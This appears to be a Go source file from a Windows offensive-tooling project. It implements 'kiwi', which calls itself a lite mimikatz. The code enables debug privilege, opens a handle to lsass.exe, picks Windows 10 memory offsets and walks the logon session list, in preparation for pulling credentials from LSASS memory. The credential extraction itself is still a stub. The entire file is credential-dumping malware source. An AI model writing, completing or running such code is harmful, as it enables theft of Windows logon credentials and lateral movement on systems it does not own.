// +build windows

package kiwi

import (
	"sync"

	"github.com/pkg/errors"

	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	// privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	pid uint32

	// about Windows version
	major uint32
	minor uint32
	build uint32

	// modules about lsass.exe
	modules    []*basicModuleInfo
	modulesRWM sync.RWMutex

	// address about logon session
	logonSessionListAddr      uintptr
	logonSessionListCountAddr uintptr

	// lock above fields
	mu sync.Mutex
}

// NewKiwi is used to create a new kiwi.
func NewKiwi(logger logger.Logger) *Kiwi {
	return &Kiwi{
		logger: logger,
		rand:   random.NewRand(),
	}
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// Credential contain information.
type Credential struct {
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	patch := lsaSrvX64References[buildWin10v1507]
	kiwi.getSessionList(pHandle, patch)

	// _ = kiwi.searchMemory(pHandle, module.address, module.size)
	return nil, nil
}
